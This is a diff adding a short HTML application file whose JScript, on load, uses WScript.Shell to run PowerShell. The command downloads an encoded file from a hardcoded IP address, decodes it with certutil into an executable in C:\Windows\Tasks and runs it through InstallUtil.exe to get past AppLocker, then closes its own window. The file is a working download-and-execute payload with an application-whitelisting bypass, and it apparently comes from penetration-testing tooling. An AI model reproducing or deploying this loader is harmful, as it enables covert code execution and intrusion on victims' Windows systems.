@@ -1,0 +1,13 @@
+<html>
+	<head>
+		<script language="JScript">
+			var shell = new ActiveXObject("WScript.Shell");
+			var res = shell.Run("powershell iwr -uri http://192.168.45.250:80/Tools/myTools/SimpleApplockerRunspace/bsar.enc -outfile C:\\Windows\\Tasks\\bsar.enc; powershell certutil -decode C:\\Windows\\Tasks\\bsar.enc C:\\Windows\\Tasks\\bsar.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\bsar.exe");
+		</script>
+	</head>
+	<body>
+		<script language="JScript">
+			self.close();
+		</script>
+	</body>
+</html>
